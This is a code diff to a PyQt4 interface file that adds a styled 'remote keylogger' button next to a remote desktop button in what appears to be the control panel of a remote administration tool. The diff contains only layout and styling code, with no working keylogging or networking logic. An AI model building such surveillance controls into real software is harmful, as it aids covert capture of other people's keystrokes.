@@ -438,6 +438,37 @@ class Ui_MainWindow(object):
         self.remoteDesktopButton.setIconSize(QtCore.QSize(18, 18))
         self.remoteDesktopButton.setObjectName(_fromUtf8("remoteDesktopButton"))
         self.horizontalLayout.addWidget(self.remoteDesktopButton)
+        self.remoteKeyloggerButton = QtGui.QPushButton(self.clientButtonsGroup)
+        self.remoteKeyloggerButton.setMinimumSize(QtCore.QSize(32, 32))
+        self.remoteKeyloggerButton.setMaximumSize(QtCore.QSize(32, 32))
+        self.remoteKeyloggerButton.setStyleSheet(_fromUtf8("QPushButton#remoteKeyloggerButton {\n"
+"            background: #194759;\n"
+"            border: 1px outset;\n"
+"            border-color: #0F2D40;\n"
+"            color: white;\n"
+"            text-decoration: none;\n"
+"            background-color: qlineargradient(spread:pad, x1:1, y1:1, x2:0, y2:0, stop:0 #194759, stop:1 #225E75);\n"
+"            }\n"
+"\n"
+"QPushButton#remoteKeyloggerButton:pressed {\n"
+"            background: #0B202E;\n"
+"            border: 1px outset;\n"
+"            border-color: #0B202E;\n"
+"            }\n"
+"\n"
+"QPushButton#remoteKeyloggerButton:disabled {\n"
+"            background: #0B202E;\n"
+"            border: 1px outset;\n"
+"            color: grey;\n"
+"            border-color: #0B202E;\n"
+"            }"))
+        self.remoteKeyloggerButton.setText(_fromUtf8(""))
+        icon9 = QtGui.QIcon()
+        icon9.addPixmap(QtGui.QPixmap(_fromUtf8(":/icons/assets/mkeylogger.png")), QtGui.QIcon.Normal, QtGui.QIcon.Off)
+        self.remoteKeyloggerButton.setIcon(icon9)
+        self.remoteKeyloggerButton.setIconSize(QtCore.QSize(18, 18))
+        self.remoteKeyloggerButton.setObjectName(_fromUtf8("remoteKeyloggerButton"))
+        self.horizontalLayout.addWidget(self.remoteKeyloggerButton)
         spacerItem = QtGui.QSpacerItem(40, 20, QtGui.QSizePolicy.Expanding, QtGui.QSizePolicy.Minimum)
         self.horizontalLayout.addItem(spacerItem)
         self.clientSettingsButton = QtGui.QPushButton(self.clientButtonsGroup)
@@ -459,9 +490,9 @@ class Ui_MainWindow(object):
 "            border-color: #0B202E;\n"
 "            }"))
         self.clientSettingsButton.setText(_fromUtf8(""))
-        icon9 = QtGui.QIcon()
-        icon9.addPixmap(QtGui.QPixmap(_fromUtf8(":/icons/assets/settings.png")), QtGui.QIcon.Normal, QtGui.QIcon.Off)
-        self.clientSettingsButton.setIcon(icon9)
+        icon10 = QtGui.QIcon()
+        icon10.addPixmap(QtGui.QPixmap(_fromUtf8(":/icons/assets/settings.png")), QtGui.QIcon.Normal, QtGui.QIcon.Off)
+        self.clientSettingsButton.setIcon(icon10)
         self.clientSettingsButton.setIconSize(QtCore.QSize(20, 20))
         self.clientSettingsButton.setObjectName(_fromUtf8("clientSettingsButton"))
         self.horizontalLayout.addWidget(self.clientSettingsButton)
@@ -601,9 +632,9 @@ class Ui_MainWindow(object):
 "            color: grey;\n"
 "            border-color: #0B202E;\n"
 "            }"))
-        icon10 = QtGui.QIcon()
-        icon10.addPixmap(QtGui.QPixmap(_fromUtf8(":/icons/assets/refresh.png")), QtGui.QIcon.Normal, QtGui.QIcon.Off)
-        self.updatePreviewButton.setIcon(icon10)
+        icon11 = QtGui.QIcon()
+        icon11.addPixmap(QtGui.QPixmap(_fromUtf8(":/icons/assets/refresh.png")), QtGui.QIcon.Normal, QtGui.QIcon.Off)
+        self.updatePreviewButton.setIcon(icon11)
         self.updatePreviewButton.setIconSize(QtCore.QSize(14, 14))
         self.updatePreviewButton.setObjectName(_fromUtf8("updatePreviewButton"))
         self.gridLayout_6.addWidget(self.updatePreviewButton, 1, 0, 1, 4)
@@ -655,9 +686,9 @@ class Ui_MainWindow(object):
         self.portLabel.setObjectName(_fromUtf8("portLabel"))
         self.gridLayout_6.addWidget(self.portLabel, 3, 2, 1, 1)
         self.gridLayout_2.addWidget(self.panelGroup, 0, 1, 2, 1)
-        icon11 = QtGui.QIcon()
-        icon11.addPixmap(QtGui.QPixmap(_fromUtf8(":/icons/assets/server.png")), QtGui.QIcon.Normal, QtGui.QIcon.Off)
-        self.MainTabWidget.addTab(self.serversTab, icon11, _fromUtf8(""))
+        icon12 = QtGui.QIcon()
+        icon12.addPixmap(QtGui.QPixmap(_fromUtf8(":/icons/assets/server.png")), QtGui.QIcon.Normal, QtGui.QIcon.Off)
+        self.MainTabWidget.addTab(self.serversTab, icon12, _fromUtf8(""))
         self.gridLayout_5.addWidget(self.MainTabWidget, 1, 0, 1, 1)
         MainWindow.setCentralWidget(self.centralwidget)
         self.menubar = QtGui.QMenuBar(MainWindow)
